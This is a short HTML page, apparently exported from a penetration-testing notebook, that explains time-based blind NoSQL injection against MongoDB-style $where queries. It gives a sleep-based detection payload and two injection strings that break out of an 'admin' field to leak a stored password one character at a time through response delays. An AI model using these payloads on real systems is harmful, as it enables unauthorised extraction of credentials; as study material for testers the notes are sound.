@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Timing based injection</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Timing based injection</h1><br/><p>There may be situations where triggering a database error doesn&#39;t cause a difference in the application&#39;s response. In this sitaution, use {&quot;$where&quot;: “sleep(5000)&quot;} to detect difference in the server responses.</p><p>Here are two examples implementing the time based search:<ul><li>admin&#39;+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]===&quot;a&quot;) &amp;&amp; waitTill &gt; new Date()){};}(this)+&#39;</li><li>admin&#39;+function(x){if(x.password[0]===&quot;a&quot;){sleep(5000)};}(this)+&#39; </li></ul></p></div>
+</body>
+</html>
